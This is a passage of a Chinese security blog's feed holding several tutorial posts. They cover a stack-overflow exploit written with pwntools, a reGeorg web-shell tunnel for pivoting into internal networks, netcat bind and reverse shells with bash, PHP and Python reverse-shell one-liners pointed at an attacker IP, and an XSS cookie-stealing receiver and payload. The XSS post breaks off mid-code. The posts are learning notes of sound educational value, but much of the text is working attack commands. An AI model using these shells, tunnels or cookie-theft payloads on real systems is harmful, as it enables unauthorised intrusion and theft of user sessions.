    <content type="html"><![CDATA[<h1 id="系统栈和经典栈溢出"><a href="#系统栈和经典栈溢出" class="headerlink" title="系统栈和经典栈溢出"></a>系统栈和经典栈溢出</h1><h3 id="寄存器ebp和esp"><a href="#寄存器ebp和esp" class="headerlink" title="寄存器ebp和esp"></a>寄存器ebp和esp</h3><ul><li><p>寄存器ebp指向  <u>当前的栈帧</u> 的底部（高地址）；</p></li><li><p>寄存器esp指向  <u> 当前的栈帧</u> 的顶部（低地址）；</p></li></ul><h3 id="函数栈帧"><a href="#函数栈帧" class="headerlink" title="函数栈帧"></a>函数栈帧</h3><ul><li>函数返回地址：函数调用前的指令位置；</li><li>栈帧状态值：保存前栈帧的顶部和底部（实际只保存前栈帧的底部，顶部可以通过堆栈平衡计算得出）；</li><li>局部变量：为函数局部变量开辟的内存空间；</li></ul><h3 id="函数调用过程"><a href="#函数调用过程" class="headerlink" title="函数调用过程"></a>函数调用过程</h3><ul><li>参数入栈：</li></ul><p>参数从右往左依次压入系统栈中；</p><ul><li>返回地址入栈：</li></ul><p>当前代码区调用的指令的下一条指令地址入栈（call中的压栈）；</p><ul><li>代码区跳转：</li></ul><p>处理器从当前代码区跳转到被调用函数的入口处（call中的跳转）；</p><ul><li>调整栈帧：</li></ul><p>保存当前栈帧状态值 –&gt; ebp入栈（push ebp）；</p><p>将当前栈帧切换到新栈帧 –&gt; esp装入ebp的值，更新栈帧底部 （mov ebp，esp）；</p><p>给新栈帧分配空间 –&gt; 把esp减少所需空间大小，抬高栈顶（sub esp,xxx）；</p><p>对应汇编（假设三个参数）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">push 参数2</span><br><span class="line"></span><br><span class="line">push 参数1</span><br><span class="line"></span><br><span class="line">push 参数0  // 至此调用第一步压参数完成</span><br><span class="line"></span><br><span class="line">call 调用地址  // 同时完成第二步和第三步，把下一条指令的地址压栈并跳转</span><br><span class="line"></span><br><span class="line">push ebp  // 保存当前栈</span><br><span class="line"></span><br><span class="line">mov ebp,esp // 设置新栈帧的底部（切换栈帧）</span><br><span class="line"></span><br><span class="line">sub esp，空间大小  // 设置新栈帧的顶部（抬高栈帧）</span><br></pre></td></tr></table></figure><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/push%E5%8F%82%E6%95%B0.png" alt></p><p>上图完成了第一步，把三个参数都压入栈中</p><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/call.png" alt></p><p>上图完成了第二步和第三步。call操作把下一条指令的地址作为返回地址压入栈，eip跳转到代码区执行</p><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/%E4%BF%9D%E5%AD%98%E6%97%A7%E6%A0%88%E5%BA%95.png" alt></p><p>上图完成第四步中保存当前栈的操作，把当前栈的底部压入栈</p><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%9B%B4%E6%96%B0%E6%A0%88%E5%BA%95.png" alt></p><p>上图完成了第四步里面的更新栈底，把栈顶指针移动到当前栈的最上方</p><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%BC%80%E8%BE%9F%E7%A9%BA%E9%97%B4.png" alt></p><p>栈顶指针自减上移，开辟了新的栈帧空间。上图到此完成了函数调用过程，形成了上图这样的调用栈</p><ul><li>除了最后一张图，其他图中称ebp为 “当前栈底” 是因为当前还没有通过sub来开辟新的栈帧，所以现在还是处在当前栈帧内。而且现在呈现出来的当前栈的  “底部在头部” 的现象是因为，我们是把当前的栈底的值拿到了顶部进行保存（），而不是改变栈底为栈顶，当前栈 “底部” 依然处在底部；</li><li>最后一张图的 “前栈帧” 是针对刚新开辟的栈帧空间来说的（即图上标注“栈帧空间的部分”），此时的栈帧已经不是上一点注释中的那个了。而且我们能通过前栈帧的ebp（上一点注释中 “位于顶部” 的 “底部”）这个值，定位出前一个栈；</li></ul><blockquote><p>附上一张 x86 系统调用栈（注意下图的栈方向和上面的相反）</p></blockquote><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88.jpg" alt></p><h3 id="经典栈溢出"><a href="#经典栈溢出" class="headerlink" title="经典栈溢出"></a>经典栈溢出</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123; <span class="built_in">puts</span>(<span class="string">"You Hava already controlled it."</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们用以下gcc命令对程序进行编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example</span><br></pre></td></tr></table></figure><blockquote><p> m32 指的是生成 32 位程序； </p><p>-fno-stack-protector 指的是不开启堆栈溢出保护，即不生成 canary；</p><p>关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令gcc -v查看 gcc 默认的开关情况。如果含有–enable-default-pie参数则代表 PIE 默认已开启，需要在编译指令中添加参数-no-pie；</p><p>为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）； </p></blockquote><p>则目前该程序不开启canary （没有canary导致可以覆盖出栈的空间） 、开启了NX （堆栈不可执行，即使在堆栈中写入shellcode也不能执行）、不开启 PIE 和 ASLR （没有地址随机化，让我们能直接覆盖上success的地址）</p><p>然后我们跟进 vulneravle函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vulnerable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+4h] [bp-14h]@1</span></span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出其栈结构：</p><p><img src="/2019/11/30/%E7%B3%BB%E7%BB%9F%E6%A0%88%E5%92%8C%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%A0%88%E7%BB%93%E6%9E%84.png" alt></p><p>因为程序里面有shellcode的函数success，我们不需要自己注入shellcode（也因为开启了NX在栈注入shellcode也没用），直接溢出覆盖原返回地址为函数success的地址即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">'./stack_example'</span>)</span><br><span class="line"><span class="comment">##ida解析出的success的地址</span></span><br><span class="line">success_addr = <span class="number">0x0804843b</span></span><br><span class="line"><span class="comment">## 构造payload</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x14</span> + <span class="string">'bbbb'</span> + p32(success_addr)</span><br><span class="line"><span class="keyword">print</span> p32(success_addr)</span><br><span class="line"><span class="comment">## 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">## 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>执行该EXP得到结果。</p><h3 id="一般栈溢出做法"><a href="#一般栈溢出做法" class="headerlink" title="一般栈溢出做法"></a>一般栈溢出做法</h3><h4 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h4><ul><li>输入<ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul></li></ul><h4 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h4><ul><li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li><li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li><li>直接地址索引，就相当于直接给定了地址。</li></ul><h4 id="覆盖"><a href="#覆盖" class="headerlink" title="覆盖"></a>覆盖</h4><ul><li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li><li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li><li><strong>覆盖 bss 段某个变量的内容</strong>。</li><li>根据现实执行情况，覆盖特定的变量或地址的内容。</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><blockquote><p><a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow" target="_blank" rel="noopener">stack buffer overflow</a></p><p><a href="http://bobao.360.cn/learning/detail/3694.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3694.html</a></p><p><a href="https://www.cnblogs.com/rec0rd/p/7646857.html" target="_blank" rel="noopener">https://www.cnblogs.com/rec0rd/p/7646857.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;系统栈和经典栈溢出&quot;&gt;&lt;a href=&quot;#系统栈和经典栈溢出&quot; class=&quot;headerlink&quot; title=&quot;系统栈和经典栈溢出&quot;&gt;&lt;/a&gt;系统栈和经典栈溢出&lt;/h1&gt;&lt;h3 id=&quot;寄存器ebp和esp&quot;&gt;&lt;a href=&quot;#寄存器ebp和esp&quot; cla
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>内网渗透工具之reGeorg</title>
    <link href="http://bai-ren-1.github.io/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/"/>
    <id>http://bai-ren-1.github.io/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/</id>
    <published>2019-11-21T00:38:30.000Z</published>
    <updated>2019-11-27T11:06:16.100Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网渗透工具之reGeorg-代理"><a href="#内网渗透工具之reGeorg-代理" class="headerlink" title="内网渗透工具之reGeorg+代理"></a>内网渗透工具之reGeorg+代理</h1><p>继续我们之前的学习，在我们渗透工作中，经常会出现一个服务器连接着两个网卡的情况：一个是连接外网的网卡，另一个是连接内网的网卡。我们的目标就是他连接着的内网，但我们却不能直接使用这台服务器去访问内网，因为上面缺少了我们必要的工具。为此，我们可以将这台服务器设置为我们访问内网的代理，作为跳板机打进内网</p><p>网络拓扑如下图：</p><p><img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91.png" alt></p><p>为了打出这样一条隧道，我们可以通过使用 reGeorg+Proxifier/ reGeorg +Prochains 做到，无论是哪种组合，关于 reGeorg 的操作都是一样的，所以我们把两种组合的 reGeorg 都拿出来一起说，再分别介绍不同的两个代理</p><h2 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h2><p>安装reGeorg的过程不再赘述，直接 git clone 到 kali 上，使用脚本的时候 cd 进目录就行</p><p>然后我们需要根据目标站点使用的语言上传相应版本的tunnel的脚本，埋下伏笔，上传成功的时候会显示“ 乔治说：看起来一切都很好 ”，哈哈，确实如此。</p><p>然后我们假设文件上传在根目录下，可以通过访问下面的网址： </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">http://站点的网址/<span class="title">tunnel.php</span></span></span><br></pre></td></tr></table></figure><p>访问到我们上去的隧道文件，只要我们看到下面这样的字眼，说明第一步成功了：</p><blockquote><p>Georg says, ‘All seems fine’</p></blockquote><p>然后我们再回去kali里面进行使用reGeorg的py脚本建立连接，打出一条隧道，使用命令如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -u http://站点的网址/tunnel.php(上传reGeorg脚本的地址) -p <span class="number">8888</span>（任意没有服务冲突的端口）</span><br></pre></td></tr></table></figure><p>执行的界面如下：</p><p><img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/%E7%95%8C%E9%9D%A2.png" alt></p><p>到目前这一步就算做好了，下面的就是代理的操作了。</p><h2 id="Proxifier"><a href="#Proxifier" class="headerlink" title="Proxifier"></a>Proxifier</h2><p>下面我们开始介绍 Proxifier ，首先安装后打开。然后选择 Profile-proxy servers 设置代理地址和端口（这里选择的是本地端口8888的socks5代理：</p><p><img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/proxixier%E8%AE%BE%E7%BD%AE.png" alt></p><p>然后我们就得配置代理规则（代理规则其实就相当于指定那个软件的流量经过代理，哪些不经过代理）</p><p>一般情况下我们需要使用浏览器访问内网的网页，所以就需要给浏览器配置经过代理，其他不需要代理的软件就这设为direct模式（不经过代理）</p><p> 选择 Profile-proxification Rules，根据自己的需要配置：</p><p><img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/%E9%85%8D%E7%BD%AE%E8%A7%84%E5%88%99.png" alt></p><p>然后我们就可以愉快的使用了proxifier了：</p><blockquote><p>选择   右键 -&gt; Proxifier -&gt; Proxy SOCKS 5 127.0.0.1<br>范例：<br>mstsc远程桌面右键使用代理运行实现远控内网；<br>cmd右键使用代理运行实现例如nmap扫描内网等各种功能；</p></blockquote><h2 id="Proxychain-ng"><a href="#Proxychain-ng" class="headerlink" title="Proxychain-ng"></a>Proxychain-ng</h2><p>下面我们开始介绍Proxychain，首先介绍安装：</p><p>先 git clone 到本地，然后进行操作。先进入本地文件夹，然后 ./configure 运行配置文件。等配置完成之后就使用</p><p>make &amp;&amp; make install 进行 make 安装：</p><p><img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/%E5%AE%89%E8%A3%85proxychain.png" alt></p><p>等上述安装完成后,把当前目录下的配置文件 /src/proxychains.conf 复制到 /etc/proxychains.conf 里面，删除上一层生成的文件夹，然后至此暂时阶段性胜利：</p><p><img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/%E5%AE%89%E8%A3%85proxychain-1.png" alt></p><p>然后我们对 /etc/proxychains.conf 进行配置，这里使用vim：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/proxychains.conf</span><br><span class="line">socks4 127.0.0.1 9050 //9050为你自己的端口，需要与reGeorg中设置的端口相同</span><br></pre></td></tr></table></figure><p>界面如下，我们配置sock4的配置信息，9050修改为你需要的端口（因为上面reGeorg使用了8888端口，把9050改为8888），然后保存退出：<img src="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/%E9%85%8D%E7%BD%AEproxychains%E7%AB%AF%E5%8F%A3.png" alt></p><p>最后我们就能愉快的通过如下命令使用 proxychains 了：</p><blockquote><p>在需要设置代理的软件前面加上proxychains，范例：<br>proxychains nmap<br>proxychains sqlmap </p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;内网渗透工具之reGeorg-代理&quot;&gt;&lt;a href=&quot;#内网渗透工具之reGeorg-代理&quot; class=&quot;headerlink&quot; title=&quot;内网渗透工具之reGeorg+代理&quot;&gt;&lt;/a&gt;内网渗透工具之reGeorg+代理&lt;/h1&gt;&lt;p&gt;继续我们之前的学习，
      
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://bai-ren-1.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>内网渗透工具之netcat</title>
    <link href="http://bai-ren-1.github.io/2019/11/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Bnetcat/"/>
    <id>http://bai-ren-1.github.io/2019/11/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Bnetcat/</id>
    <published>2019-11-18T08:30:46.000Z</published>
    <updated>2019-11-27T11:06:28.112Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网渗透工具总结之netcat"><a href="#内网渗透工具总结之netcat" class="headerlink" title="内网渗透工具总结之netcat"></a>内网渗透工具总结之netcat</h1><p>继续上一篇的思路，继续学习总结内网穿透的工具。这次这个工具是也是老牌的工具，誉为瑞士军刀。不多逼逼直接学习他的使用</p><h2 id="nc反弹服务器shell"><a href="#nc反弹服务器shell" class="headerlink" title="nc反弹服务器shell"></a>nc反弹服务器shell</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>操作目标机将cmd /Bash shell 绑定到它的特定端口8888，再让攻击机用简单的nc命令连接到8888端口，从而使用目标机的shell服务</p><p><img src="/2019/11/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Bnetcat/%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5.jpg" alt></p><p>假设攻击机的ip：ipA</p><p>假设目标机的ip：ipB（Windows/Linux）</p><ul><li><p>在目标机上设置监听端口：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">8888</span> -e <span class="built_in">cmd</span>.exe    [目标机为Windows]</span><br><span class="line">nc -lvp <span class="number">8888</span> -e /bin/sh    [目标机为Linux]</span><br><span class="line"></span><br><span class="line">（<span class="number">8888</span>是监听端口，可以更改为任意服务不冲突的端口）</span><br></pre></td></tr></table></figure></li><li><p>在攻击机上尝试连接：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 目标机的ip（ipB） <span class="number">8888</span></span><br></pre></td></tr></table></figure></li><li><p>连接成功之后就会在攻击机上得到远程目标机的shell</p></li></ul><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>攻击机监听它的特定端口8888，再操作目标机使用nc命令反向连接到8888端口，实现反弹shell</p><p><img src="/2019/11/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Bnetcat/%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5.jpg" alt></p><p>假设攻击机的ip：ipA</p><p>假设目标机的ip：ipB</p><ul><li>在攻击机上监听端口：</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">8888</span></span><br><span class="line"></span><br><span class="line"><span class="number">8888</span>是监听端口，可以更改为任意服务不冲突的端口</span><br></pre></td></tr></table></figure><ul><li>在目标机上尝试反向连接：</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc  攻击机的ip（ipA） <span class="number">8888</span>  -e <span class="built_in">cmd</span>.exe    [目标机为Windows]</span><br><span class="line">nc  攻击机的ip（ipA） <span class="number">8888</span>  -e /bin/sh    [目标机为Linux]</span><br></pre></td></tr></table></figure><ul><li>连接成功后会在攻击机上得到远程目标主机的shell</li></ul><h2 id="其他方式反弹shell-Linux服务器"><a href="#其他方式反弹shell-Linux服务器" class="headerlink" title="其他方式反弹shell(Linux服务器)"></a>其他方式反弹shell(Linux服务器)</h2><p>在上面反向连接中，需要目标机上装有netcat的服务，才能将服务器的shell反弹给攻击机。在很多时候，目标机上是没有该服务并且我们不能去上传或者下载到目标机上，那要如何让主机反弹shell呢？我们需要使用替代方法反向连接到攻击主机。</p><p>（注：下面无论哪种方式反弹shell都要先在自己的攻击机上开启端口监听，下面除了Bash反弹这个案例写了出来外，其他都默认用同样的方法在攻击机上用nc开启8888端口监听，然后我就不写出来了，特此说明（就是懒））</p><h3 id="Bash反向shell"><a href="#Bash反向shell" class="headerlink" title="Bash反向shell"></a>Bash反向shell</h3><p>同样在攻击机上监听8888端口等待服务器主动来反向连接</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">8888</span></span><br></pre></td></tr></table></figure><p>然后我们在目标机（Linux）的bash上执行下面的命令即可反弹shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;＆/dev/tcp/192.168.100.113（攻击机ip）/4444 0&gt;＆1</span><br></pre></td></tr></table></figure><p>命令的解释：</p><ul><li>bash -i 是打开一个交互的bash </li><li>/dev/tcp/ 是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp</li><li>0&gt;&amp;1 将标准输入重定向到标准输出中 </li></ul><blockquote><p>​    附上Linux中的文件描述符</p><ol><li><p>标准输入  (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; </p></li><li><p>标准输出  (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; </p></li><li><p>标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;</p></li></ol></blockquote><ul><li>在此处不论是 “0&gt;&amp;1” 或者 “0&lt;&amp;1”  都是将标准输入重定向到标准输出中； “&gt;&amp;” 和 “&amp;&gt;” 也是同样效果；</li></ul><h3 id="PHP反向shell"><a href="#PHP反向shell" class="headerlink" title="PHP反向shell"></a>PHP反向shell</h3><p>适用于目标机上存在php服务，绝大多数服务器上都会是这种情况。我们在目标机上执行下面命令以反弹shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock = fsockopen("192.168.100.113（攻击机ip）"，8888);exec("/bin/sh -i &lt;&amp;3&gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><h3 id="Python反向shell"><a href="#Python反向shell" class="headerlink" title="Python反向shell"></a>Python反向shell</h3><p>python不多说了，几乎每台机器都有。在目标机上用一下命令反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.113",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p = subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure><p>还有更多的姿势会在后面补充。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;内网渗透工具总结之netcat&quot;&gt;&lt;a href=&quot;#内网渗透工具总结之netcat&quot; class=&quot;headerlink&quot; title=&quot;内网渗透工具总结之netcat&quot;&gt;&lt;/a&gt;内网渗透工具总结之netcat&lt;/h1&gt;&lt;p&gt;继续上一篇的思路，继续学习总结内网穿
      
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://bai-ren-1.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>XSS的利用</title>
    <link href="http://bai-ren-1.github.io/2019/11/17/XSS%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/"/>
    <id>http://bai-ren-1.github.io/2019/11/17/XSS%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/</id>
    <published>2019-11-17T09:36:29.136Z</published>
    <updated>2019-11-27T11:24:22.469Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS的利用"><a href="#XSS的利用" class="headerlink" title="XSS的利用"></a>XSS的利用</h1><p>起因是上一次面试的时候，在谈及XSS的利用方式时，我只能答得上盗取Cookie和蠕虫，后面回想发现XSS利用这方面确实很薄弱，于是进行就来对这方面进行总结</p><h2 id="一、XSS盗取Cookie"><a href="#一、XSS盗取Cookie" class="headerlink" title="一、XSS盗取Cookie"></a>一、XSS盗取Cookie</h2><h4 id="通过自己搭建简陋平台"><a href="#通过自己搭建简陋平台" class="headerlink" title="通过自己搭建简陋平台"></a>通过自己搭建简陋平台</h4><p>首先我们得有自己的一台服务器，然后在服务器上配置类似这样的用来接收cookie的脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$cookie = $_GET[&apos;cookie&apos;];</span><br><span class="line">$log = fopen(&quot;cookie.txt&quot;, &quot;a&quot;);</span><br><span class="line">fwrite($log, $cookie .&quot;\n&quot;);</span><br><span class="line">fclose($log);</span><br><span class="line">?&gt;</span><br><span class="line">//假设这段代码的文件名为Getcookie.php</span><br></pre></td></tr></table></figure><p>上面代码的作用很明显，就是接收cookie字段的参数的值，然后新建一个文件cookie.txt。随后把cookie的值写进文件，并关闭文件。这样的话，只要我们把盗取的cookie通过cookie参数发给我们服务器，就会自动被写进这个文件里面了</p><p>然后我们需要做的就是在诱骗受害者点击包含有下面这种发出跨站请求的payload的链接。payload的形式有很多种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//第一种script标签</span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Image().src=&quot;http://我们的服务器域名/Getcookie.php?cookie=&quot;+document.cookie;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//第二种script标签</span><br><span 